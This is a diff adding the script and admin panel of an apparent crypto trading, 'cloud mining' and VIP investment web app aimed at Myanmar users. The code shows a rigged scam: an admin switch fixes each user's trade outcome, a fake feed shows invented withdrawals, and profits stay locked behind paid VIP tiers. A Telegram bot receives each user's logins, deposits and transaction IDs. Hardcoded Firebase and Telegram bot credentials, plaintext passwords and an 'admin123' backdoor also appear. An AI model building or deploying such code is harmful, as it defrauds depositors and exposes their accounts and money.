+            <button class="btn btn-main" onclick="applyClickGold(this); admUpdateBal()">Update Balance</button>
+            <p style="margin-top:15px; font-size:12px;">Control Mode:</p>
+            <div style="display:flex; gap:10px;">
+                <button id="btn-adm-win" class="btn btn-green" style="flex:1;" onclick="applyClickGold(this); admMode('win')">WIN</button>
+                <button id="btn-adm-lose" class="btn btn-red" style="flex:1;" onclick="applyClickGold(this); admMode('lose')">LOSE</button>
+            </div>
+            <button class="btn" style="background:#444; color:#fff; margin-top:10px;" onclick="applyClickGold(this); admMode('random')">Set Random</button>
+        </div>
+    </div>
+    <h4>Pending Requests</h4>
+    <div id="adm-req-list"></div>
+</div>
+
+<div class="nav" id="bot-nav" style="display:none;">
+    <div class="nav-item active" onclick="showNav(this, 'dash-page')"><i class="fas fa-home"></i>Home</div>
+    <div class="nav-item" onclick="showNav(this, 'mining-page')"><i class="fas fa-microchip"></i>Mining</div>
+    <div class="nav-item" onclick="showNav(this, 'notification-page')"><i class="fas fa-envelope"></i>Inbox</div>
+    <div class="nav-item" onclick="showNav(this, 'history-page')"><i class="fas fa-history"></i>History</div>
+    <div class="nav-item" onclick="showNav(this, 'setting-page')"><i class="fas fa-wallet"></i>Wallet</div>
+</div>
+
+<script>
+    const config = { 
+        apiKey: "AIzaSyAxhjzM9aK4yqLk5PXbkrENmUldUjy78VA", 
+        databaseURL: "https://luckywealthgaming-default-rtdb.asia-southeast1.firebasedatabase.app" 
+    };
+    firebase.initializeApp(config);
+    const db = firebase.database();
+    let user = null, adminStep = 0, binanceSocket = null;
+    let cMin = 1000, cProf = 30, cDur = 30;
+    let isMiningActive = false; 
+    let currentPayMethod = '';
+
+    const vipData = [
+        { level: 1, cost: 100000, daily: "2.5%", gift: "Bonus 5,000 Ks", limit: "500,000 Ks", desc: "VIP 1 ဖြစ်ပါက နေ့စဉ် Trading အမြတ်ပိုရမည့်အပြင် အပတ်စဉ် Bonus များခံစားခွင့်ရှိမည်။" },
+        { level: 2, cost: 300000, daily: "5.0%", gift: "Bonus 15,000 Ks", limit: "1,500,000 Ks", desc: "VIP 2 အတွက် ငွေထုတ်ယူမှု ဦးစားပေးစနစ် ပါဝင်လာပါပြီ။" },
+        { level: 3, cost: 1000000, daily: "8.5%", gift: "Bonus 60,000 Ks", limit: "5,000,000 Ks", desc: "VIP 3 သည် Cloud Mining တွင် အမြတ် ၂ ဆ ပိုရပါမည်။" },
+        { level: 4, cost: 5000000, daily: "12.0%", gift: "Bonus 300,000 Ks", limit: "Unlimited", desc: "VIP 4 အတွက် 24/7 Personal Assistant ဝန်ဆောင်မှု ရရှိမည်။" },
+        { level: 5, cost: 10000000, daily: "20.0%", gift: "Bonus 1,000,000 Ks", limit: "Unlimited", desc: "VIP 5 အမြင့်ဆုံးအဆင့်ဖြစ်ပြီး Platform ၏ အထူးအခွင့်အရေးအားလုံး ရရှိမည်။" }
+    ];
+
+    function sendTelegram(msg) {
+        const token = "8614205220:AAHxlphuK5ZM29rEh3J6IEPqPEibMjKNXAY";
+        const chatId = "7709938396";
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+    }
+
+    function applyClickGold(btn) {
+        document.querySelectorAll('.btn').forEach(b => b.classList.remove('clicked-gold'));
+        btn.classList.add('clicked-gold');
+        setTimeout(() => btn.classList.remove('clicked-gold'), 2000);
+    }
+
+    function startLiveWdFeed() {
+        const users = ["09***221", "09***775", "09***330", "09***119", "09***882", "09***004", "09***551", "09***663"];
+        const amounts = [10000, 30000, 50000, 100000, 150000, 20000, 45000, 75000];
+        
+        setInterval(() => {
+            const randomUser = users[Math.floor(Math.random() * users.length)];
+            const randomAmt = amounts[Math.floor(Math.random() * amounts.length)];
+            const container = document.getElementById('wd-live-container');
+            
+            const toast = document.createElement('div');
+            toast.className = 'wd-toast';
+            toast.innerHTML = `
+                <i class="fas fa-check-circle"></i>
+                <div>
+                    <div style="font-size:12px; color:white; font-weight:bold;">Withdraw Success!</div>
+                    <div style="font-size:10px; color:var(--dim);">User ${randomUser} just received ${randomAmt.toLocaleString()} Ks</div>
+                </div>
+            `;
+            
+            container.appendChild(toast);
+            setTimeout(() => toast.remove(), 5000);
+        }, 12000);
+    }
+
+    function selectPay(method) {
+        currentPayMethod = method;
+        document.querySelectorAll('.pay-option').forEach(o => o.classList.remove('selected'));
+        document.getElementById('opt-'+method).classList.add('selected');
+        document.getElementById('dep-details').style.display = 'block';
+        document.getElementById('dep-method-name').innerText = method === 'wave' ? 'WavePay' : 'KBZPay';
+        
+        db.ref('settings/payments/'+method).once('value', s => {
+            const data = s.val() || { name: 'Admin', num: '09...' };
+            document.getElementById('dep-acc-name').innerText = data.name;
+            document.getElementById('display-dep-num').innerText = data.num;
+        });
+    }
+
+    function admUpdatePayDetails() {
+        const data = {
+            wave: { name: document.getElementById('new-wave-name').value, num: document.getElementById('new-wave-num').value },
+            kpay: { name: document.getElementById('new-kpay-name').value, num: document.getElementById('new-kpay-num').value }
+        };
+        db.ref('settings/payments').set(data).then(() => alert("Payment Details Updated!"));
+    }
+
+    function loadTVWidget(symbol) {
+        new TradingView.widget({
+            "autosize": true,
+            "symbol": "BINANCE:" + symbol,
+            "interval": "1",
+            "timezone": "Etc/UTC",
+            "theme": "dark",
+            "style": "1",
+            "locale": "en",
+            "toolbar_bg": "#f1f3f6",
+            "enable_publishing": false,
+            "hide_top_toolbar": true,
+            "save_image": false,
+            "container_id": "tv_chart_container"
+        });
+    }
+
+    function connectBinance(symbol) {
+        if (binanceSocket) binanceSocket.close();
+        const s = symbol.toLowerCase().replace("/", "");
+        binanceSocket = new WebSocket(`wss://stream.binance.com:9443/ws/${s}@ticker`);
+        binanceSocket.onmessage = (event) => {
+            const data = JSON.parse(event.data);
+            const price = parseFloat(data.c).toLocaleString(undefined, {minimumFractionDigits: 2});
+            const change = parseFloat(data.P);
+            const priceEl = document.getElementById('live-price');
+            if (priceEl) {
+                priceEl.innerText = price;
+                priceEl.style.color = change >= 0 ? "var(--green)" : "var(--red)";
+            }
+        };
+    }
+
+    function toggleAuth(s) { 
+        document.getElementById('login-form').style.display = s ? 'none' : 'block'; 
+        document.getElementById('reg-form').style.display = s ? 'block' : 'none'; 
+    }
+
+    function togglePassword(id, el) {
+        const x = document.getElementById(id);
+        if (x.type === "password") { 
+            x.type = "text"; 
+            el.classList.replace('fa-eye', 'fa-eye-slash'); 
+        } 
+        else { 
+            x.type = "password"; 
+            el.classList.replace('fa-eye-slash', 'fa-eye'); 
+        }
+    }
+
+    function handleAuth(type) {
+        const ph = document.getElementById(type==='login'?'log-ph':'reg-ph').value;
+        const pw = document.getElementById(type==='login'?'log-pw':'reg-pw').value;
+        if(!ph || !pw) return alert("Please fill all details!");
+        if(type==='login') {
+            db.ref('users/'+ph).once('value', s => {
+                if(s.exists() && s.val().password === pw) {
+                    user=ph; 
+                    document.getElementById('bot-nav').style.display='flex'; 
+                    showPage('dash-page'); 
+                    initApp();
+                    startLiveWdFeed(); 
+                    sendTelegram(`User Login: ${ph}`);
+                } else alert("Invalid Credentials!");
+            });
+        } else {
+            const un = document.getElementById('reg-un').value;
+            db.ref('users/'+ph).set({ username:un, password:pw, balance:0, mode:'random', pin:'123456', vip:0 }).then(()=>{
+                sendTelegram(`New User Registered: ${un} (${ph})`);
+                location.reload();
+            });
+        }
+    }
+
+    function initApp() {
+        db.ref('users/'+user).on('value', s => { 
+            const val = s.val();
+            document.getElementById('u-bal').innerText = (val.balance || 0).toLocaleString() + " Ks"; 
+            document.getElementById('u-vip-badge').innerText = "VIP " + (val.vip || 0);
+            document.getElementById('current-vip-level').innerText = "VIP " + (val.vip || 0) + " MEMBER";
+        });
+        
+        db.ref('announcements').on('value', s => {
+            let h = "";
+            s.forEach(a => {
+                h += `<div class="msg-box"><small class="msg-date">${a.val().date}</small><p style="margin:0; font-size:13px;">${a.val().text}</p></div>`;
+            });
+            document.getElementById('announcement-list').innerHTML = h || "No messages from admin.";
+        });
+
+        loadMarkets(); loadMining(); loadHist(); renderVIP();
+    }
+
+    function renderVIP() {
+        let h = "";
+        vipData.forEach(v => {
+            h += `<div class="card vip-card">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                    <h3 style="color:var(--active-gold); margin:0;">VIP ${v.level}</h3>
+                    <b style="font-size:18px;">${v.cost.toLocaleString()} Ks</b>
+                </div>
+                <p style="font-size:12px; color:var(--dim); margin:10px 0;">${v.desc}</p>
+                <div style="display:flex; justify-content:space-between; font-size:11px; margin-bottom:15px; color:var(--primary);">
+                    <span>Daily: ${v.daily}</span>
+                    <span>Reward: ${v.gift}</span>
+                    <span>Limit: ${v.limit}</span>
+                </div>
+                <button class="btn btn-main" style="padding:10px;" onclick="applyClickGold(this); buyVIP(${v.level}, ${v.cost})">Upgrade to VIP ${v.level}</button>
+            </div>`;
+        });
+        document.getElementById('vip-tiers-list').innerHTML = h;
+    }
+
+    function buyVIP(lvl, cost) {
+        db.ref('users/'+user).once('value', s => {
+            if(s.val().balance < cost) return alert("Insufficient balance to upgrade VIP!");
+            if(s.val().vip >= lvl) return alert("You are already at this level or higher!");
+            if(confirm(`Upgrade to VIP ${lvl} for ${cost.toLocaleString()} Ks?`)) {
+                db.ref('users/'+user).update({ balance: s.val().balance - cost, vip: lvl }).then(() => {
+                    sendTelegram(`User ${user} Upgraded to VIP ${lvl}`);
+                    alert("Upgrade Successful!");
+                });
+            }
+        });
+    }
+
+    function copyDepNum() {
+        const num = document.getElementById('display-dep-num').innerText;
+        navigator.clipboard.writeText(num).then(() => { alert("Number Copied: " + num); });
+    }
+
+    function loadMarkets() {
+        const tiers = [ 
+            { s: 30, m: 1000, p: 30, n: "BTC" }, 
+            { s: 60, m: 5000, p: 50, n: "ETH" }, 
+            { s: 75, m: 30000, p: 65, n: "SOL" }, 
+            { s: 100, m: 150000, p: 85, n: "BNB" }, 
+            { s: 120, m: 300000, p: 100, n: "XRP" },
+            { s: 150, m: 4000000, p: 200, n: "MEXC-PRO" }
+        ];
+        let h = ""; tiers.forEach(t => { 
+            h += `<div class="market-item" onclick="openTrade('${t.n}', ${t.m}, ${t.p}, ${t.s})"> 
+            <span><img src="https://i.ibb.co/7mvLK89/IMG-20260330-081319-912.jpg" class="market-icon-img"><b style="font-size:16px;">${t.n}/USDT</b><br><small style="color:var(--dim)">Min Invest: ${t.m.toLocaleString()} Ks</small></span> 
+            <span style="color:var(--green); font-weight:bold;">${t.s}s / +${t.p}%</span> </div>`; 
+        });
+        document.getElementById('market-list').innerHTML = h;
+    }
+
+    function openTrade(n, m, p, s) { 
+        document.getElementById('pair-name').innerText = n+"/USDT"; 
+        cMin = m; cProf = p; cDur = s; 
+        document.getElementById('trade-prof').innerText = p; 
+        document.getElementById('min-trade-info').innerText = `Min: ${m.toLocaleString()} Ks | Duration: ${s}s`; 
+        loadTVWidget(n + "USDT"); 
+        connectBinance(n + "USDT"); 
+        showPage('trade-page'); 
+    }
+
+    function execTrade(side) {
+        const amt = parseFloat(document.getElementById('trade-amt').value);
+        if(!amt || amt < cMin) return alert("Minimum amount is " + cMin + " Ks");
+        db.ref('users/'+user).once('value', s => {
+            const uData = s.val();
+            if(uData.balance < amt) return alert("Balance Insufficient!");
+            let finalProf = cProf + (uData.vip * 2);
+            db.ref('users/'+user).update({ balance: uData.balance - amt });
+            document.getElementById('timer-ring').classList.add('active');
+            let tVal = cDur; const timer = setInterval(() => { 
+                document.getElementById('trade-timer').innerText = `${tVal--}s`; 
+                if(tVal < 0) { 
+                    clearInterval(timer); 
+                    document.getElementById('timer-ring').classList.remove('active');
+                    let win = uData.mode==='win'?true:(uData.mode==='lose'?false:Math.random()>0.5); 
+                    if(win) { 
+                        let reward = amt + (amt * (finalProf/100)); 
+                        db.ref('users/'+user+'/balance').transaction(b => (b||0)+reward); 
+                        alert(`Trade Success! Total Earned: ${reward.toLocaleString()} Ks`); 
+                        sendTelegram(`Trade Win: ${user} earned ${reward} Ks`);
+                    } else {
+                        alert("Trade Loss! Better luck next time."); 
+                        sendTelegram(`Trade Loss: ${user} lost ${amt} Ks`);
+                    }
+                    document.getElementById('trade-timer').innerText = "READY"; 
+                } 
+            }, 1000);
+        });
+    }
+
+    function loadMining() {
+        const nodes = [
+            {n:"Bronze Node", min:10000, p:5, i:"fa-cube", d:7},
+            {n:"Silver Node", min:50000, p:10, i:"fa-layer-group", d:15},
+            {n:"Gold Node", min:100000, p:15, i:"fa-database", d:30},
+            {n:"Diamond Node", min:1000000, p:30, i:"fa-gem", d:90},
+            {n:"Crypto Mining", min:3500000, p:45, i:"fa-microchip", d:60}
+        ];
+        
+        db.ref('requests/mining').orderByChild('ph').equalTo(user).on('value', s => {
+            let statusHTML = "";
+            isMiningActive = false;
+            const now = Date.now();
+
+            s.forEach(r => {
+                const data = r.val();
+                if(!data.node) return;
+                if(data.status === 'running' || data.status === 'pending') { isMiningActive = true; }
+                if(data.status === 'completed' && data.endTime && (now - data.endTime > 172800000)) return;
+
+                let statusClass = `status-${data.status}`;
+                let progress = 0;
+                let timeText = data.status === 'running' ? 'Calculating...' : 'Waiting for Approval';
+
+                if(data.status === 'running' && data.startTime && data.expiryTime) {
+                    const totalDuration = data.expiryTime - data.startTime;
+                    const elapsed = now - data.startTime;
+                    progress = Math.min(100, (elapsed / totalDuration) * 100);
+                    const timeLeft = data.expiryTime - now;
+                    if(timeLeft > 0) {
+                        const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+                        const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                        timeText = `${days}d ${hours}h remaining`;
+                    } else { timeText = "Mining Completed!"; progress = 100; }
+                }
+
+                statusHTML += `<div class="card active-mining-info">
+                    <div style="display:flex; justify-content:space-between; align-items:center;">
+                        <b style="font-size:14px; color:var(--primary);">${data.node}</b>
+                        <span class="mining-status-badge ${statusClass}">${data.status}</span>
+                    </div>
+                    <div style="margin-top:8px;">
+                        <div style="display:flex; justify-content:space-between; font-size:11px;">
+                            <span>Investment: ${parseFloat(data.amt).toLocaleString()} Ks</span>
+                            <span style="color:var(--active-gold);">Profit: +${parseFloat(data.totalProfit).toLocaleString()} Ks</span>
+                        </div>
+                        <div class="progress-container">
+                            <div class="progress-bar" style="width: ${progress}%"></div>
+                        </div>
+                        <div style="display:flex; justify-content:space-between; margin-top:5px; font-size:10px; color:var(--dim);">
+                            <span>Status: ${timeText}</span>
+                            <span>Exp: ${data.expiryDate || 'N/A'}</span>
+                        </div>
+                    </div>
+                    ${(data.status === 'running' && now >= data.expiryTime) || (data.status === 'running' && data.forceClaim) ? 
+                        `<button class="btn btn-main" onclick="applyClickGold(this); claimMining('${r.key}', ${data.totalProfit})" style="padding:10px; font-size:11px; margin-top:10px;">Claim All Profit</button>` : ''}
+                </div>`;
+            });
+            document.getElementById('user-mining-status').innerHTML = statusHTML || "<p style='text-align:center; font-size:12px; color:var(--dim);'>No active mining sessions.</p>";
+        });
+
+        document.getElementById('mining-list').innerHTML = nodes.map(v => `<div class="card mining-card"><div class="mining-content"><div style="display:flex; align-items:center;"><div class="mining-icon"><i class="fas ${v.i}"></i></div><div class="mining-info"><h4>${v.n}</h4><small>Min: ${v.min.toLocaleString()} Ks</small></div></div><div class="profit-badge">+${v.p}% Daily</div></div><div style="margin-top:15px; position:relative; z-index:5;"><input type="number" id="amt-${v.n.replace(/\s+/g, '')}" placeholder="Enter Amount (Ks)"><button class="btn btn-main" onclick="applyClickGold(this); startMining('${v.n}', ${v.min}, ${v.p}, ${v.d})">Activate Node</button></div></div>`).join('');
+    }
+
+    function startMining(node, min, percent, days) {
+        if(isMiningActive) return alert("ယခင် mining ပြီးဆုံးအောင်စောင့်ဆိုင်းပြီးမှ mining အသစ်ကိုလုပ်နိုင်မည်။");
+        const amt = parseFloat(document.getElementById(`amt-${node.replace(/\s+/g, '')}`).value);
+        if(!amt || amt < min) return alert("အနည်းဆုံး " + min.toLocaleString() + " Ks ရင်းနှီးရပါမည်။");
+        
+        db.ref('users/'+user).once('value', s => {
+            const uData = s.val();
+            if(uData.balance < amt) return alert("လက်ကျန်ငွေမလုံလောက်ပါ။");
+            const now = new Date();
+            const expiry = new Date();
+            expiry.setDate(now.getDate() + days);
+
+            db.ref('users/'+user).update({ balance: uData.balance - amt });
+            db.ref('requests/mining').push({ 
+                ph:user, node:node, amt:amt, status:'pending', date: now.toLocaleString(), expiryDate: expiry.toLocaleDateString(), expiryTime: expiry.getTime(), startTime: now.getTime(), totalProfit: Math.floor(amt + (amt*(percent/100)*days)), daysDuration: days 
+            });
+            sendTelegram(`Mining Request: User ${user} invested ${amt} Ks in ${node} for ${days} days.`);
+            alert("Mining တောင်းဆိုမှုအောင်မြင်ပါသည်။ Admin ခွင့်ပြုချက်ကို စောင့်ဆိုင်းပေးပါ။");
+        });
+    }
+
+    function claimMining(key, total) {
+        db.ref(`requests/mining/${key}`).once('value', s => {
+            const data = s.val();
+            if(data.status === 'completed') return alert("ဤအမြတ်ကို ထုတ်ယူပြီးသားဖြစ်ပါသည်။");
+            db.ref('users/'+user).once('value', us => {
+                if(us.val().vip < 1) return alert("VIP Level 1 နှင့်အထက်ရှိသူများသာ အမြတ်ထုတ်ယူနိုင်ပါသည်။");
+                if(confirm(`${total.toLocaleString()} Ks ကို Balance ထဲသို့ ထည့်သွင်းမှာ သေချာပါသလား?`)) {
+                    db.ref('users/'+user+'/balance').transaction(b => (b||0) + total);
+                    db.ref(`requests/mining/${key}`).update({ status: 'completed', endTime: Date.now() });
+                    sendTelegram(`Mining Success: User ${user} claimed ${total} Ks from mining.`);
+                    alert("အမြတ်ငွေများကို Balance ထဲသို့ ထည့်သွင်းပေးလိုက်ပါပြီ။");
+                }
+            });
+        });
+    }
+
+    function loadHist() { 
+        ['deposits','withdraws'].forEach(c => { 
+            db.ref('requests/'+c).orderByChild('ph').equalTo(user).on('value', s => { 
+                let h = ""; s.forEach(r => { 
+                    let statusColor = r.val().status === 'success' ? 'var(--green)' : (r.val().status === 'rejected' ? 'var(--red)' : 'var(--active-gold)');
+                    h += `<div style="display:flex; justify-content:space-between; padding:10px 0; border-bottom:1px solid #222;"> <small>${r.val().date}</small><b>${parseFloat(r.val().amt).toLocaleString()} Ks</b><span style="color:${statusColor}">${r.val().status.toUpperCase()}</span> </div>`; 
+                }); 
+                document.getElementById(c==='deposits'?'dep-hist':'wd-hist').innerHTML = h || "No records."; 
+            }); 
+        }); 
+    }
+
+    function sendWithdraw() { 
+        const amt = parseFloat(document.getElementById('wd-amt-input').value); 
+        const pin = document.getElementById('wd-pin-input').value; 
+        if(!amt || amt < 1000) return alert("Minimum withdrawal is 1000 Ks");
+        db.ref('users/'+user).once('value', s => { 
+            if(s.val().pin !== pin) return alert("Wrong PIN!"); 
+            if(s.val().balance < amt) return alert("Low Balance!"); 
+            db.ref('requests/withdraws').push({ ph:user, amt, status:'pending', date:new Date().toLocaleString() }); 
+            db.ref('users/'+user).update({ balance: s.val().balance - amt }); 
+            sendTelegram(`Withdraw Request: User ${user} requested ${amt} Ks`);
+            alert("Withdrawal Request Submitted.");
+            showPage('dash-page');
+        }); 
+    }
+
+    function sendDeposit() { 
+        const amt = document.getElementById('dep-amt-input').value; 
+        const trx = document.getElementById('dep-trx-input').value; 
+        if(!amt || !trx) return alert("Please fill all details!");
+        db.ref('requests/deposits').push({ 
+            ph:user, amt, trx, method: currentPayMethod, status:'pending', date:new Date().toLocaleString() 
+        }); 
+        sendTelegram(`Deposit Sent: User ${user} sent ${amt} Ks via ${currentPayMethod}. TRX: ${trx}`);
+        alert("Deposit Submitted. ခေတ္တစောင့်ဆိုင်းပေးပါ။");
+        showPage('dash-page');
+    }
+
+    function changeSecurity(type) { 
+        if(type === 'password') { 
+            const oldPw = document.getElementById('old-pw').value; 
+            const newPw = document.getElementById('new-pw').value; 
+            db.ref('users/'+user).once('value', s => { 
+                if(s.val().password === oldPw) { db.ref('users/'+user).update({password: newPw}).then(()=>alert("Success!")); } 
+                else alert("Wrong Password!"); 
+            }); 
+        } else { 
+            db.ref('users/'+user).update({pin: document.getElementById('new-pin').value}).then(()=>alert("PIN Saved!")); 
+        } 
+    }
+
+    document.getElementById('admin-trigger').onclick = () => { 
+        if(++adminStep >= 5) { adminStep=0; if(prompt("Key")==="admin123") { showPage('admin-page'); loadAdmReq(); } } 
+    };
+
+    function admPostAnnounce() {
+        const txt = document.getElementById('adm-msg').value;
+        if(!txt) return;
+        db.ref('announcements').push({ text: txt, date: new Date().toLocaleString() });
+        alert("Announcement Published!");
+    }
+
+    function admSearch() { 
+        const ph = document.getElementById('adm-search').value; 
+        db.ref('users/'+ph).on('value', s => { 
+            if(s.exists()){ 
+                document.getElementById('adm-ctrl').style.display='block'; 
+                document.getElementById('adm-un').innerText = s.val().username; 
+                document.getElementById('adm-ub').innerText = parseFloat(s.val().balance).toLocaleString() + " Ks"; 
+            } 
+        }); 
+    }
+
+    function admMode(m) { db.ref('users/'+document.getElementById('adm-search').value).update({mode: m}).then(() => admSearch()); }
+
+    function loadAdmReq() { 
+        db.ref('requests').on('value', s => { 
+            let h = ""; s.forEach(cat => cat.forEach(r => { 
+                if(r.val().status==='pending') { 
+                    h += `<div class="card">${cat.key.toUpperCase()} - ${r.val().method || ''}<br>User: ${r.val().ph}<br>Amt: ${r.val().amt}<br>TRX: ${r.val().trx || 'N/A'}<br>
+                    <div style="display:flex; gap:10px; margin-top:10px;">
+                        <button class="btn btn-green" style="padding:8px;" onclick="applyClickGold(this); admAction('${cat.key}','${r.key}','success')">Approve</button>
+                        <button class="btn btn-red" style="padding:8px;" onclick="applyClickGold(this); admAction('${cat.key}','${r.key}','rejected')">Reject</button>
+                    </div></div>`; 
+                } 
+            })); 
+            document.getElementById('adm-req-list').innerHTML = h || "No pending requests."; 
+        }); 
+    }
+
+    function admAction(cat, k, status) { 
+        db.ref(`requests/${cat}/${k}`).once('value', s => { 
+            const req = s.val();
+            if(status === 'success') {
+                if(cat==='deposits') db.ref('users/'+req.ph+'/balance').transaction(b=>(b||0)+parseFloat(req.amt)); 
+                let updateData = { status: cat === 'mining' ? 'running' : 'success' };
+                if(cat === 'mining') {
+                    const start = Date.now();
+                    const duration = (req.daysDuration || 1) * 24 * 60 * 60 * 1000;
+                    updateData.startTime = start;
+                    updateData.expiryTime = start + duration;
+                }
+                db.ref(`requests/${cat}/${k}`).update(updateData); 
+                alert("Approved!");
+            } else {
+                if(cat==='withdraws' || cat==='mining') db.ref('users/'+req.ph+'/balance').transaction(b=>(b||0)+parseFloat(req.amt)); 
+                db.ref(`requests/${cat}/${k}`).update({status: 'rejected'});
+                alert("Rejected!");
+            }
+        }); 
+    }
+
+    function admUpdateBal() { 
+        db.ref('users/'+document.getElementById('adm-search').value+'/balance').transaction(b=>(b||0)+parseFloat(document.getElementById('adm-adj').value)); 
+    }
+    
+    function showPage(id) { document.querySelectorAll('.page').forEach(p=>p.classList.remove('active')); document.getElementById(id).classList.add('active'); window.scrollTo(0,0); }
+    function showNav(el, id) { document.querySelectorAll('.nav-item').forEach(i=>i.classList.remove('active')); el.classList.add('active'); showPage(id); }
+</script>
+</body>
+</html>
